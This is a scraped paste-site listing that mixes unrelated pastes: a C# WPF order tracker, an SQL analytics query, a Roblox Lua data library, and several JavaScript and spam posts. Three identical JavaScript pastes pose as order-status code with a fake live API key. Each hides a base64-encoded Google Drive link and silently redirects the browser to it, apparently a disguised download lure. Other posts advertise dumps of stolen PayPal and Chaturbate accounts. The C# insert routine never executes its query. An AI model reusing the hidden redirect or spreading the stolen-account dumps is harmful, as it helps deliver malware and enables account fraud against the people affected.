        private static string connectionString = ""Data Source=Data/orders.db;Version=3;"";

        public static void InitializeDatabase()
        {
            if (!File.Exists(""Data/orders.db""))
            {
                SQLiteConnection.CreateFile(""Data/orders.db"");
            }

            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                connection.Open();
                string createTableQuery = @""
                CREATE TABLE IF NOT EXISTS Orders (
                    Id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ClientName TEXT NOT NULL,
                    ServiceType TEXT NOT NULL,
                    Status TEXT DEFAULT 'Новый',
                    CreatedAt TEXT DEFAULT CURRENT_TIMESTAMP
                )"";
                new SQLiteCommand(createTableQuery, connection).ExecuteNonQuery();
            }
        }
    }
}

MainWindow.xaml.cs: 
namespace OrderTracker
{
    public partial class MainWindow : Window
    {
        private List<Order> allOrders = new List<Order>();

        public MainWindow()
        {
            InitializeComponent();
            InitializeDatabase();
            LoadOrders();
        }

        private void InitializeDatabase()
        {
            if (!System.IO.File.Exists(""Data/orders.db""))
            {
                SQLiteConnection.CreateFile(""Data/orders.db"");
            }

            using (var connection = new SQLiteConnection(""Data Source=Data/orders.db;Version=3;""))
            {
                connection.Open();
                string query = @""
                    CREATE TABLE IF NOT EXISTS Orders (
                        Id INTEGER PRIMARY KEY AUTOINCREMENT,
                        OrderNumber TEXT NOT NULL UNIQUE,
                        ClientName TEXT NOT NULL,
                        PhoneNumber TEXT,
                        Email TEXT,
                        ServiceType TEXT NOT NULL,
                        Status TEXT DEFAULT 'Новый',
                        CreatedAt TEXT DEFAULT CURRENT_TIMESTAMP,
                        Deadline TEXT,
                        Price REAL,
                        Comments TEXT
                    )"";
                new SQLiteCommand(query, connection).ExecuteNonQuery();
            }
        }

        private void LoadOrders()
        {
            allOrders = new List<Order>();

            using (var connection = new SQLiteConnection(""Data Source=Data/orders.db;Version=3;""))
            {
                connection.Open();
                string query = ""SELECT * FROM Orders"";
                var command = new SQLiteCommand(query, connection);
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        allOrders.Add(new Order
                        {
                            Id = reader.GetInt32(reader.GetOrdinal(""Id"")),
                            OrderNumber = reader.IsDBNull(reader.GetOrdinal(""OrderNumber"")) ? null : reader.GetString(reader.GetOrdinal(""OrderNumber"")),
                            ClientName = reader.GetString(reader.GetOrdinal(""ClientName"")),
                            PhoneNumber = reader.IsDBNull(reader.GetOrdinal(""PhoneNumber"")) ? null : reader.GetString(reader.GetOrdinal(""PhoneNumber"")),
                            ServiceType = reader.GetString(reader.GetOrdinal(""ServiceType"")),
                            Status = reader.GetString(reader.GetOrdinal(""Status"")),
                            CreatedAt = DateTime.Parse(reader.GetString(reader.GetOrdinal(""CreatedAt"")))
                        });
                    }
                }
            }

            ApplyFilters();
        }

        private void ApplyFilters()
        {
            if (SearchTextBox == null || FilterComboBox == null || OrdersGrid == null)
                return;

            string searchText = SearchTextBox.Text?.ToLower() ?? """";
            string statusFilter = (FilterComboBox.SelectedItem as ComboBoxItem)?.Content.ToString() ?? ""Все"";

            var filtered = allOrders.Where(order =>
                (statusFilter == ""Все"" || order.Status == statusFilter) &&
                (string.IsNullOrWhiteSpace(searchText) ||
                 (order.ClientName?.ToLower().Contains(searchText) ?? false) ||
                 (order.OrderNumber?.ToLower().Contains(searchText) ?? false)))
            .ToList();

            OrdersGrid.ItemsSource = filtered;
        }

        private void SearchTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            ApplyFilters();
        }

        private void FilterComboBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            ApplyFilters();
        }

        private void AddOrderButton_Click(object sender, RoutedEventArgs e)
        {
            var addOrderWindow = new AddOrderWindow();
            if (addOrderWindow.ShowDialog() == true)
            {
                LoadOrders();
            }
        }

        private void CopyPhoneMenuItem_Click(object sender, RoutedEventArgs e)
        {
            if (OrdersGrid.SelectedItem is Order selectedOrder && !string.IsNullOrEmpty(selectedOrder.PhoneNumber))
            {
                Clipboard.SetText(selectedOrder.PhoneNumber);
                ShowSnackbarMessage($""Телефон скопирован: {selectedOrder.PhoneNumber}"");
            }
        }

        private void CopyNameMenuItem_Click(object sender, RoutedEventArgs e)
        {
            if (OrdersGrid.SelectedItem is Order selectedOrder)
            {
                Clipboard.SetText(selectedOrder.ClientName);
                ShowSnackbarMessage($""Имя скопировано: {selectedOrder.ClientName}"");
            }
        }

        private void ShowSnackbarMessage(string message)
        {
            MainSnackbar.MessageQueue?.Enqueue(
                message,
                null,
                null,
                null,
                false,
                true,
                TimeSpan.FromSeconds(2));
        }
    }




    public class Order
    {
        public int Id { get; set; }
        public string OrderNumber { get; set; }
        public string ClientName { get; set; }
        public string PhoneNumber { get; set; } 
        public string ServiceType { get; set; }
        public string Status { get; set; }
        public DateTime CreatedAt { get; set; }
    }
}

MainWindow.xaml:
<Window x:Class=""OrderTracker.MainWindow""
        xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
        xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
        xmlns:materialDesign=""http://materialdesigninxaml.net/winfx/xaml/themes""
        Title=""Трекер заказов"" Height=""450"" Width=""800"">
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height=""Auto""/>
            <RowDefinition Height=""*""/>
            <RowDefinition Height=""Auto""/>
        </Grid.RowDefinitions>

        <!-- Панель поиска и фильтров -->
        <StackPanel Grid.Row=""0"" Orientation=""Horizontal"" Margin=""5"">
            <TextBox x:Name=""SearchTextBox"" Width=""200"" Margin=""5"" 
                     TextChanged=""SearchTextBox_TextChanged""/>
            <ComboBox x:Name=""FilterComboBox"" Width=""150"" Margin=""5""
                      SelectedIndex=""0""
                      SelectionChanged=""FilterComboBox_SelectionChanged"">
                <ComboBoxItem>Все</ComboBoxItem>
                <ComboBoxItem>Новые</ComboBoxItem>
                <ComboBoxItem>В работе</ComboBoxItem>
                <ComboBoxItem>Завершённые</ComboBoxItem>
            </ComboBox>

            <!-- Кнопка добавления справа -->
            <Button x:Name=""AddOrderButton"" 
                    Grid.Row=""0""
                    Content=""Добавить заказ"" 
                    Width=""120"" 
                    Height=""30""
                    Margin=""5,5,10,5""
                    HorizontalAlignment=""Right""
                    Click=""AddOrderButton_Click""/>
        </StackPanel>

        <!-- Таблица заказов -->
        <DataGrid x:Name=""OrdersGrid"" 
                 Grid.Row=""1"" 
                 Margin=""10"" 
                 AutoGenerateColumns=""False"">
            <DataGrid.ContextMenu>
                <ContextMenu>
                    <MenuItem Header=""Копировать телефон"" Click=""CopyPhoneMenuItem_Click""/>
                    <MenuItem Header=""Копировать имя"" Click=""CopyNameMenuItem_Click""/>
                </ContextMenu>
            </DataGrid.ContextMenu>
            <DataGrid.Columns>
                <DataGridTextColumn Header=""ID"" Binding=""{Binding Id}"" Width=""Auto""/>
                <DataGridTextColumn Header=""Номер заказа"" Binding=""{Binding OrderNumber}"" Width=""*""/>
                <DataGridTextColumn Header=""Клиент"" Binding=""{Binding ClientName}"" Width=""*""/>
                <DataGridTextColumn Header=""Телефон"" Binding=""{Binding PhoneNumber}"" Width=""*""/>
                <DataGridTextColumn Header=""Услуга"" Binding=""{Binding ServiceType}"" Width=""*""/>
                <DataGridTextColumn Header=""Статус"" Binding=""{Binding Status}"" Width=""*""/>
            </DataGrid.Columns>
        </DataGrid>

        <!-- Snackbar уведомления -->
        <materialDesign:Snackbar x:Name=""MainSnackbar""
                                Grid.Row=""2""
                                HorizontalAlignment=""Left""
                                VerticalAlignment=""Bottom""
                                Margin=""20""/>
    </Grid>
</Window>

AddOrderWindow.xaml:
<Window x:Class=""OrderTracker.AddOrderWindow""
        xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
        xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
        Title=""Добавить новый заказ"" 
        Height=""300"" 
        Width=""400""
        WindowStartupLocation=""CenterOwner"">
    <Grid Margin=""10"">
        <Grid.RowDefinitions>
            <RowDefinition Height=""Auto""/>
            <RowDefinition Height=""Auto""/>
            <RowDefinition Height=""Auto""/>
            <RowDefinition Height=""*""/>
            <RowDefinition Height=""Auto""/>
        </Grid.RowDefinitions>

        <Label Content=""Имя клиента:"" Grid.Row=""0""/>
        <TextBox x:Name=""ClientNameTextBox"" Grid.Row=""1"" Margin=""0,0,0,10""/>

        <Label Content=""Тип услуги:"" Grid.Row=""2""/>
        <ComboBox x:Name=""ServiceTypeComboBox"" Grid.Row=""3"" Margin=""0,0,0,20"">
            <ComboBoxItem>Вывеска</ComboBoxItem>
            <ComboBoxItem>Баннер</ComboBoxItem>
            <ComboBoxItem>Визитка</ComboBoxItem>
            <ComboBoxItem>Другое</ComboBoxItem>
        </ComboBox>

        <StackPanel Grid.Row=""4"" Orientation=""Horizontal"" HorizontalAlignment=""Right"">
            <Button Content=""Отмена"" Width=""80"" Margin=""0,0,10,0"" Click=""CancelButton_Click""/>
            <Button Content=""Сохранить"" Width=""80"" Click=""SaveButton_Click""/>
        </StackPanel>
    </Grid>
</Window>

AddOrderWindow.xaml.cs:
namespace OrderTracker
{
    public partial class AddOrderWindow : Window
    {
        public AddOrderWindow()
        {
            InitializeComponent();
        }

        private void SaveButton_Click(object sender, RoutedEventArgs e)
        {
            // Проверка заполнения имени клиента
            if (string.IsNullOrWhiteSpace(ClientNameTextBox.Text))
            {
                MessageBox.Show(""Пожалуйста, введите имя клиента"", ""Ошибка"",
                               MessageBoxButton.OK, MessageBoxImage.Warning);
                ClientNameTextBox.Focus();
                return;
            }

            // Проверка выбранной услуги
            if (ServiceTypeComboBox.SelectedItem == null)
            {
                MessageBox.Show(""Пожалуйста, выберите тип услуги"", ""Ошибка"",
                               MessageBoxButton.OK, MessageBoxImage.Warning);
                ServiceTypeComboBox.Focus();
                return;
            }

            string orderNumber = GenerateOrderNumber();

            using (var connection = new SQLiteConnection(""Data Source=Data/orders.db;Version=3;""))
            {
                connection.Open();
                string query = @""INSERT INTO Orders (OrderNumber, ClientName, ServiceType, Status) 
                 VALUES (@number, @name, @service, @status)"";

                var command = new SQLiteCommand(query, connection);
                command.Parameters.AddWithValue(""@number"", orderNumber);
                command.Parameters.AddWithValue(""@name"", ClientNameTextBox.Text);
                command.Parameters.AddWithValue(""@service"", (ServiceTypeComboBox.SelectedItem as ComboBoxItem)?.Content.ToString());
                command.Parameters.AddWithValue(""@status"", ""Новый"");
            }

            MessageBox.Show($""Заказ {orderNumber} успешно создан!"", ""Успех"",
                           MessageBoxButton.OK, MessageBoxImage.Information);
            DialogResult = true;
            Close();
        }

        private string GenerateOrderNumber()
        {
            return $""ORD-{DateTime.Now:yyyyMMdd}-{new Random().Next(1000, 9999)}"";
        }

        private void CancelButton_Click(object sender, RoutedEventArgs e)
        {
            DialogResult = false;
            Close();
        }
    }
}"
GjasApGH,Untitled,YuvalGai,SQL,Wednesday 23rd of April 2025 04:47:51 AM CDT,"select 
 MATCH_LOP_EVENT_ID calendar_entry_id
,MATCH_LOP_EVENT_TYPE lo_event_id
,is_random_mixer
,CASE
                         WHEN MATCH_EVENT_TYPE_ID = 2 THEN 'Classic'
                         WHEN MATCH_EVENT_TYPE_ID = 3 THEN 'Challenge'
                         WHEN MATCH_EVENT_TYPE_ID = 4 THEN 'Tournament'
                         when MATCH_LOP_EVENT_ID like '%boosters-clash%' or MATCH_LOP_EVENT_ID like '%booster-clash%' then 'BoostersClash'
                         WHEN MATCH_LOP_EVENT_ID LIKE '%mutation%' and PVP_MODE = 'Solo' THEN 'SoloMutationLab'
                         WHEN MATCH_EVENT_TYPE_ID = 5 and (MATCH_MODIFIER_1 = 'win-by-knockout' or MATCH_MODIFIER_2 = 'win-by-knockout' or match_modifier_3 = 'win-by-knockout') AND is_random_mixer = TRUE then 'Random Knockout'
                         WHEN MATCH_EVENT_TYPE_ID = 5 and (MATCH_MODIFIER_1 = 'win-by-knockout' or MATCH_MODIFIER_2 = 'win-by-knockout' or match_modifier_3 = 'win-by-knockout') then 'Knockout'
                         WHEN MATCH_EVENT_TYPE_ID = 5 and (MATCH_MODIFIER_1 = 'rumble-duo-modifier' or MATCH_MODIFIER_2 = 'rumble-duo-modifier' or match_modifier_3 = 'rumble-duo-modifier' or lower(rumble_type) = 'showdown') AND is_random_mixer = TRUE then 'Random Showdown'
                         WHEN MATCH_EVENT_TYPE_ID = 5 and (MATCH_MODIFIER_1 = 'rumble-duo-modifier' or MATCH_MODIFIER_2 = 'rumble-duo-modifier' or match_modifier_3 = 'rumble-duo-modifier' or lower(rumble_type) = 'showdown') then 'Showdown'
                         when lower(rumble_type) = 'party' then 'Rumble Party'
                         WHEN MATCH_EVENT_TYPE_ID = 5 AND is_random_mixer = TRUE then 'Random Mixer'
                         WHEN MATCH_EVENT_TYPE_ID = 5 THEN 'Daily'
                         when pvp_mode = 'Rumble' or lower(rumble_type) = 'classic' then 'Rumble'
                         when MATCH_LOP_EVENT_ID like '%onboarding%' then 'Onboarding'
                         when PVP_MODE = 'Solo' then 'Solo'
                         when MATCH_LOP_EVENT_ID like '%adventure%' then 'Adventure'

                         ELSE 'Other'
                     END AS MATCH_type
,count(distinct nvl(match_mode_type,'Null')) modes
, count(*) events
, sum(case when match_mode_type is null then 1 else 0 end) null_cases
from SNOWPLOW.DERIVED.USER_MATCH_TOTAL where match_end_date >= current_date - 30 and is_random_mixer = False and (is_developer = false or IS_DEVELOPER is null) group by all having modes>1 order by modes desc"
ptq8C4v5,Market.js,jm33,JavaScript,Wednesday 23rd of April 2025 04:39:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/29891/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jw35i071,PayPal with Balance,SpawnKz,JavaScript,Wednesday 23rd of April 2025 04:38:55 AM CDT,43318 Accounts Posted On https://t.me/leakedbyeminem
iCggKCqE,Untitled,jm33,JavaScript,Wednesday 23rd of April 2025 04:24:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZmmN0idf,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Wednesday 23rd of April 2025 04:23:32 AM CDT,27169 Accounts Posted On https://t.me/leakedbyeminem
Ceq3jU9z,Products.js,jm33,JavaScript,Wednesday 23rd of April 2025 04:08:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56402/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZPwuDPw1,Chaturbate with Tokens,SpawnKz,JavaScript,Wednesday 23rd of April 2025 04:07:59 AM CDT,77736 Accounts Posted On https://t.me/leakedbyeminem
KMJM7YWf,ProfileStore,DevSarim,Lua,Wednesday 23rd of April 2025 04:04:48 AM CDT,"--[[
MAD STUDIO (by loleris)

-[ProfileStore]---------------------------------------

	Periodic DataStore saving solution with session locking
	
	WARNINGS FOR ""Profile.Data"" VALUES:
	 	! Do not create numeric tables with gaps - attempting to store such tables will result in an error.
		! Do not create mixed tables (some values indexed by number and others by a string key)
			- only numerically indexed  data will be stored.
		! Do not index tables by anything other than numbers and strings.
		! Do not reference Roblox Instances
		! Do not reference userdata (Vector3, Color3, CFrame...) - Serialize userdata before referencing
		! Do not reference functions
		
	Members:
	
		ProfileStore.IsClosing          [bool]
			-- Set to true after a game:BindToClose() trigger
			
		ProfileStore.IsCriticalState    [bool]
			-- Set to true when ProfileStore experiences too many consecutive errors
		
		ProfileStore.OnError            [Signal] (message, store_name, profile_key)
			-- Most ProfileStore errors will be caught and passed to this signal
			
		ProfileStore.OnOverwrite        [Signal] (store_name, profile_key)
			-- Triggered when a DataStore key was likely used to store data that wasn't
			a ProfileStore profile or the ProfileStore structure was invalidly manually
			altered for that DataStore key
			
		ProfileStore.OnCriticalToggle   [Signal] (is_critical)
			-- Triggered when ProfileStore experiences too many consecutive errors
		
		ProfileStore.DataStoreState     [string] (""NotReady"", ""NoInternet"", ""NoAccess"", ""Access"")
			-- This value resembles ProfileStore's access to the DataStore; The value starts
			as ""NotReady"" and will eventually change to one of the other 3 possible values.
	
	Functions:
	
		ProfileStore.New(store_name, template?) --> [ProfileStore]
			store_name   [string] -- DataStore name
			template     [table] or nil -- Profiles will default to given table (hard-copy) when no data was saved previously
			
		ProfileStore.SetConstant(name, value)
			name    [string]
			value   [number]
				
	Members [ProfileStore]:
	
		ProfileStore.Mock   [ProfileStore]
			-- Reflection of ProfileStore methods, but the methods will now query a mock
			DataStore with no relation to the real DataStore
			
		ProfileStore.Name   [string]
		
	Methods [ProfileStore]:
	
		ProfileStore:StartSessionAsync(profile_key, params?) --> [Profile] or nil
			profile_key [string] -- DataStore key
			params      nil or [table]: -- Custom params; E.g. {Steal = true}
				{
					Steal = true, -- Pass this to disregard an existing session lock
					Cancel = fn() -> (boolean), -- Pass this to create a request cancel condition.
						-- If the cancel function returns true, ProfileStore will stop trying to
						-- start the session and return nil
				}
			
		ProfileStore:MessageAsync(profile_key, message) --> is_success [bool]
			profile_key [string] -- DataStore key
			message     [table] -- Data to be messaged to the profile
			
		ProfileStore:GetAsync(profile_key, version?) --> [Profile] or nil
			-- Reads a profile without starting a session - will not autosave
			profile_key   [string] -- DataStore key
			version       nil or [string] -- DataStore key version

		ProfileStore:VersionQuery(profile_key, sort_direction?, min_date?, max_date?) --> [VersionQuery]
			profile_key      [string]
			sort_direction   nil or [Enum.SortDirection]
			min_date         nil or [DateTime]
			max_date         nil or [DateTime]
			
		ProfileStore:RemoveAsync(profile_key) --> is_success [bool]
			-- Completely removes profile data from the DataStore / mock DataStore with no way to recover it.

	Methods [VersionQuery]:

		VersionQuery:NextAsync() --> [Profile] or nil -- (Yields)
			-- Returned profile is similar to profiles returned by ProfileStore:GetAsync()
		
	Members [Profile]:
	
		Profile.Data               [table]
			-- When the profile is active changes to this table are guaranteed to be saved
		Profile.LastSavedData      [table] (Read-only)
			-- Last snapshot of ""Profile.Data"" that has been successfully saved to the DataStore;
			Useful for proper developer product purchase receipt handling
		
		Profile.FirstSessionTime   [number] (Read-only)
			-- os.time() timestamp of the first profile session
			
		Profile.SessionLoadCount   [number] (Read-only) -- Amount of times a session was started for this profile
			
		Profile.Session            [table] (Read-only) {PlaceId = number, JobId = string} / nil
			-- Set to a table if this profile is in use by a server; nil if released

		Profile.RobloxMetaData     [table] -- Writable table that gets saved automatically and once the profile is released
		Profile.UserIds            [table] -- (Read-only) -- {user_id [number], ...} -- User ids associated with this profile

		Profile.KeyInfo            [DataStoreKeyInfo] -- Changes before OnAfterSave signal
		
		Profile.OnSave             [Signal] ()
			-- Triggered right before changes to Profile.Data are saved to the DataStore
			
		Profile.OnLastSave         [Signal] (reason [string]: ""Manual"", ""External"", ""Shutdown"")
			-- Triggered right before changes to Profile.Data are saved to the DataStore
			for the last time; A reason is provided for the last save:
				- ""Manual""   - Profile:EndSession() was called
				- ""Shutdown"" - The server that has ownership of this profile is shutting down
				- ""External"" - Another server has started a session for this profile
			Note that this event will not trigger for when a profile session is ended by
			another server trying to take ownership of the session - this is impossible to
			do without compromising on ProfileStore's speed.
			
		Profile.OnSessionEnd       [Signal] ()
			-- Triggered when the profile session is terminated on this server
		
		Profile.OnAfterSave        [Signal] (last_saved_data)
			-- Triggered after a successful save
			last_saved_data [table] -- Profile.LastSavedData
			
		Profile.ProfileStore       [ProfileStore] -- ProfileStore object this profile belongs to
		Profile.Key                [string] -- DataStore key
		
	Methods [Profile]:
	
		Profile:IsActive() --> [bool] -- If ""true"" is returned, changes to Profile.Data are guaranteed to save;
			This guarantee is only valid until code yields (e.g. task.wait() is used).
			
		Profile:Reconcile() -- Fills in missing (nil) [string_key] = [value] pairs to the Profile.Data structure
			from the ""template"" argument that was passed to ""ProfileStore.New()""
			
		Profile:EndSession() -- Call after the server has finished working with this profile
			e.g., after the player leaves (Profile object will become inactive)

		Profile:AddUserId(user_id) -- Associates user_id with profile (GDPR compliance)
			user_id   [number]

		Profile:RemoveUserId(user_id) -- Removes user_id association with profile (safe function)
			user_id   [number]
			
		Profile:MessageHandler(fn) -- Sets a message handler for this profile
			fn [function] (message [table], processed [function]())
			-- The handler function receives a message table and a callback function;
			The callback function is to be called when a message has been processed
			- this will discard the message from the profile message cache; If the
			callback function is not called, other message handlers will also be triggered
			with unprocessed message data.
			
		Profile:Save() -- If the profile session is still active makes an UpdateAsync call
			to the DataStore to immediately save profile data

		Profile:SetAsync() -- Forcefully saves changes to the profile; Only for profiles
			loaded with ProfileStore:GetAsync() or ProfileStore:VersionQuery()
		
--]]

local AUTO_SAVE_PERIOD = 300 -- (Seconds) Time between when changes to a profile are saved to the DataStore
local LOAD_REPEAT_PERIOD = 10 -- (Seconds) Time between successive profile reads when handling a session conflict
local FIRST_LOAD_REPEAT = 5 -- (Seconds) Time between first and second profile read when handling a session conflict
local SESSION_STEAL = 40 -- (Seconds) Time until a session conflict is resolved with the waiting server stealing the session
local ASSUME_DEAD = 630 -- (Seconds) If a profile hasn't had updates for this long, quickly assume an active session belongs to a crashed server
local START_SESSION_TIMEOUT = 120 -- (Seconds) If a session can't be started for a profile for this long, stop repeating calls to the DataStore

local CRITICAL_STATE_ERROR_COUNT = 5 -- Assume critical state if this many issues happen in a short amount of time
local CRITICAL_STATE_ERROR_EXPIRE = 120 -- (Seconds) Individual issue expiration
local CRITICAL_STATE_EXPIRE = 120 -- (Seconds) Critical state expiration

local MAX_MESSAGE_QUEUE = 1000 -- Max messages saved in a profile that were sent using ""ProfileStore:MessageAsync()""

----- Dependencies -----

-- local Util = require(game.ReplicatedStorage.Shared.Util)
-- local Signal = Util.Signal

local Signal do

	local FreeRunnerThread

	--[[
		Yield-safe coroutine reusing by stravant;
		Sources:
		https://devforum.roblox.com/t/lua-signal-class-comparison-optimal-goodsignal-class/1387063
		https://gist.github.com/stravant/b75a322e0919d60dde8a0316d1f09d2f
	--]]

	local function AcquireRunnerThreadAndCallEventHandler(fn, ...)
		local acquired_runner_thread = FreeRunnerThread
		FreeRunnerThread = nil
		fn(...)
		-- The handler finished running, this runner thread is free again.
		FreeRunnerThread = acquired_runner_thread
	end

	local function RunEventHandlerInFreeThread(...)
		AcquireRunnerThreadAndCallEventHandler(...)
		while true do
			AcquireRunnerThreadAndCallEventHandler(coroutine.yield())
		end
	end

	local Connection = {}
	Connection.__index = Connection

	local SignalClass = {}
	SignalClass.__index = SignalClass

	function Connection:Disconnect()

		if self.is_connected == false then
			return
		end

		local signal = self.signal
		self.is_connected = false
		signal.listener_count -= 1

		if signal.head == self then
			signal.head = self.next
		else
			local prev = signal.head
			while prev ~= nil and prev.next ~= self do
				prev = prev.next
			end
			if prev ~= nil then
				prev.next = self.next
			end
		end

	end

	function SignalClass.New()

		local self = {
			head = nil,
			listener_count = 0,
		}
		setmetatable(self, SignalClass)

		return self

	end

	function SignalClass:Connect(listener: (...any) -> ())

		if type(listener) ~= ""function"" then
			error(`[{script.Name}]: \""listener\"" must be a function; Received {typeof(listener)}`)
		end

		local connection = {
			listener = listener,
			signal = self,
			next = self.head,
			is_connected = true,
		}
		setmetatable(connection, Connection)

		self.head = connection
		self.listener_count += 1

		return connection

	end

	function SignalClass:GetListenerCount(): number
		return self.listener_count
	end

	function SignalClass:Fire(...)
		local item = self.head
		while item ~= nil do
			if item.is_connected == true then
				if not FreeRunnerThread then
					FreeRunnerThread = coroutine.create(RunEventHandlerInFreeThread)
				end
				task.spawn(FreeRunnerThread, item.listener, ...)
			end
			item = item.next
		end
	end

	function SignalClass:Wait()
		local co = coroutine.running()
		local connection
		connection = self:Connect(function(...)
			connection:Disconnect()
			task.spawn(co, ...)
		end)
		return coroutine.yield()
	end

	Signal = table.freeze({
		New = SignalClass.New,
	})

end

----- Private -----

local ActiveSessionCheck = {} -- {[session_token] = profile, ...}
local AutoSaveList = {} -- {profile, ...} -- Loaded profile table which will be circularly auto-saved
local IssueQueue = {} -- {issue_time, ...}

local DataStoreService = game:GetService(""DataStoreService"")
local MessagingService = game:GetService(""MessagingService"")
local HttpService = game:GetService(""HttpService"")
local RunService = game:GetService(""RunService"")

local PlaceId = game.PlaceId
local JobId = game.JobId

local AutoSaveIndex = 1 -- Next profile to auto save
local LastAutoSave = os.clock()

local LoadIndex = 0

local ActiveProfileLoadJobs = 0 -- Number of active threads that are loading in profiles
local ActiveProfileSaveJobs = 0 -- Number of active threads that are saving profiles

local CriticalStateStart = 0 -- os.clock()

local IsStudio = RunService:IsStudio()
local DataStoreState: ""NotReady"" | ""NoInternet"" | ""NoAccess"" | ""Access"" = ""NotReady""

local MockStore = {}
local UserMockStore = {}
local MockFlag = false

local OnError = Signal.New() -- (message, store_name, profile_key)
local OnOverwrite = Signal.New() -- (store_name, profile_key)

local UpdateQueue = { -- For stability sake, we won't do UpdateAsync calls for the same key until all previous calls finish
	--[[
		[session_token] = {
			coroutine, ...
		},
		...
	--]]
}

local function WaitInUpdateQueue(session_token) --> next_in_queue()

	local is_first = false

	if UpdateQueue[session_token] == nil then
		is_first = true
		UpdateQueue[session_token] = {}
	end

	local queue = UpdateQueue[session_token]

	if is_first == false then
		table.insert(queue, coroutine.running())
		coroutine.yield()
	end

	return function()
		local next_co = table.remove(queue, 1)
		if next_co ~= nil then
			coroutine.resume(next_co)
		else
			UpdateQueue[session_token] = nil
		end
	end

end

local function SessionToken(store_name, profile_key, is_mock)

	local session_token = ""L_"" -- Live

	if is_mock == true then
		session_token = ""U_"" -- User mock
	elseif DataStoreState ~= ""Access"" then
		session_token = ""M_"" -- Mock, cause no DataStore access
	end

	session_token ..= store_name .. ""\0"" .. profile_key

	return session_token

end

local function DeepCopyTable(t)
	local copy = {}
	for key, value in pairs(t) do
		if type(value) == ""table"" then
			copy[key] = DeepCopyTable(value)
		else
			copy[key] = value
		end
	end
	return copy
end

local function ReconcileTable(target, template)
	for k, v in pairs(template) do
		if type(k) == ""string"" then -- Only string keys will be reconciled
			if target[k] == nil then
				if type(v) == ""table"" then
					target[k] = DeepCopyTable(v)
				else
					target[k] = v
				end
			elseif type(target[k]) == ""table"" and type(v) == ""table"" then
				ReconcileTable(target[k], v)
			end
		end
	end
end

local function RegisterError(error_message, store_name, profile_key) -- Called when a DataStore API call errors
	warn(`[{script.Name}]: DataStore API error (STORE:{store_name}; KEY:{profile_key}) - {tostring(error_message)}`)
	table.insert(IssueQueue, os.clock()) -- Adding issue time to queue
	OnError:Fire(tostring(error_message), store_name, profile_key)
end

local function RegisterOverwrite(store_name, profile_key) -- Called when a corrupted profile is loaded
	warn(`[{script.Name}]: Invalid profile was overwritten (STORE:{store_name}; KEY:{profile_key})`)
	OnOverwrite:Fire(store_name, profile_key)
end

local function NewMockDataStoreKeyInfo(params)

	local version_id_string = tostring(params.VersionId or 0)
	local meta_data = params.MetaData or {}
	local user_ids = params.UserIds or {}

	return {
		CreatedTime = params.CreatedTime,
		UpdatedTime = params.UpdatedTime,
